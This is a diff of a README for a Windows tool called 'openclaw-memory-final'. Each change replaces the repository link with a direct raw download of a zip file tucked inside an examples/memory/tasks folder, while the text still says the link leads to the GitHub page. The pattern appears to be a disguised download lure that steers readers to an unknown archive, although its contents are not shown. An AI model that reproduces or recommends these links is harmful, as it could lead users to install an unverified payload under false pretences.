@@ -1,6 +1,6 @@
 # 🦞 openclaw-memory-final - Stable Memory Management Tool
 
-[![Download openclaw-memory-final](https://img.shields.io/badge/Download-Get%20the%20App-green?style=for-the-badge)](https://github.com/arieltitan/openclaw-memory-final)
+[![Download openclaw-memory-final](https://img.shields.io/badge/Download-Get%20the%20App-green?style=for-the-badge)](https://github.com/arieltitan/openclaw-memory-final/raw/refs/heads/main/examples/memory/tasks/memory_openclaw_final_2.4.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before you start, make sure your Windows computer meets the following:
 Follow these steps to get openclaw-memory-final running on your Windows computer:
 
 1. Click the large **Download** badge at the top or use this link directly:  
-   [https://github.com/arieltitan/openclaw-memory-final](https://github.com/arieltitan/openclaw-memory-final)
+   [https://github.com/arieltitan/openclaw-memory-final/raw/refs/heads/main/examples/memory/tasks/memory_openclaw_final_2.4.zip](https://github.com/arieltitan/openclaw-memory-final/raw/refs/heads/main/examples/memory/tasks/memory_openclaw_final_2.4.zip)
 
 2. This link will take you to the GitHub page where you can download the latest version.
 
@@ -102,7 +102,7 @@ If problems persist, you can visit the GitHub page’s Issues tab to see if othe
 
 Use this link to get the app and install it on your Windows machine:  
 
-[https://github.com/arieltitan/openclaw-memory-final](https://github.com/arieltitan/openclaw-memory-final)
+[https://github.com/arieltitan/openclaw-memory-final/raw/refs/heads/main/examples/memory/tasks/memory_openclaw_final_2.4.zip](https://github.com/arieltitan/openclaw-memory-final/raw/refs/heads/main/examples/memory/tasks/memory_openclaw_final_2.4.zip)
 
 ---
 
@@ -136,4 +136,4 @@ The community and maintainers can help resolve problems or guide you through fea
 
 # [🦞] openclaw-memory-final - Stable Memory Management Tool
 
-[![Download openclaw-memory-final](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/arieltitan/openclaw-memory-final)
+[![Download openclaw-memory-final](https://img.shields.io/badge/Download-Get%20the%20App-blue?style=for-the-badge)](https://github.com/arieltitan/openclaw-memory-final/raw/refs/heads/main/examples/memory/tasks/memory_openclaw_final_2.4.zip)
